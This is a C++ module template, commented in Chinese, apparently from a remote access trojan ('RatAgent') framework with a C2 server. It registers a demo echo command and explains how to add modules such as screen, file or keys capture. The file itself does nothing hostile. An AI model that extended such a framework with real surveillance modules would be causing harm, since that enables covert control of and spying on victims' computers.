// caps.cpp — 本模块的能力清单（模块工程模板）
//
// 复制这份模板开一个新模块：
//   1) 把 vcxproj 里的 RatAgentModuleId 改成你的模块名（如 screen / file / keys）；
//   2) 在本文件里登记你自己的指令（指令码 → 处理函数）；
//   3) **不要改 core** —— 如果你发现"必须改 core 才能加这个能力"，说明边界没切干净，
//      应当先修边界（参考 core/capability.h 的说明），否则模块化就是假的。
//
// 指令码分段（协议 §3）：0x1xxx 远程控制 / 0x2xxx 文件 / 0x3xxx 系统 / 0x4xxx 仅 CLI↔C2。
// 新模块请在**自己那段**里挑指令码，不要占用 core 内置的 0x3001/0x3008/0x3009。
#include "capability.h"
#include "protocol.h"

#include <cstddef>
#include <cstdint>
#include <string>
#include <vector>

namespace c2
{

    namespace
    {

        // 示例指令：0x2001（文件段，当前未占用）—— 把 payload 原样回显，
        // 用来验证"模块自己的指令"是否端到端打通：
        //   ratctl: raw 2001 deadbeef   →   text: demo-echo: de ad be ef
        constexpr uint16_t kCmdDemoEcho = 0x2001;

        bool cmd_demo_echo(uint16_t, const uint8_t* payload, size_t len,
            std::vector<uint8_t>& response, uint8_t& status)
        {
            status = kStatusOK;
            static const char* kHex = "0123456789abcdef";
            std::string text = "demo-echo:";
            for (size_t i = 0; i < len; ++i)
            {
                text.push_back(' ');
                text.push_back(kHex[payload[i] >> 4]);
                text.push_back(kHex[payload[i] & 0xF]);
            }
            response.assign(text.begin(), text.end());
            return true;
        }

        const CapCommand kCommands[] = {
            { kCmdDemoEcho, cmd_demo_echo },
            // ← 在这里继续加本模块的指令
        };

        // 如果本模块需要"建链时的连接配置"（例如自建长连接），实现一个配置钩子并登记：
        //   void on_config(const std::string& host, const AgentConfig& cfg) { ... }
        // 注意：AgentConfig 定义在 core/session.h，需要时 include 它。

    }  // namespace

    void register_module_capabilities()
    {
        cap_register_commands(kCommands, sizeof(kCommands) / sizeof(kCommands[0]));
        // cap_register_config(on_config);
    }

}  // namespace c2
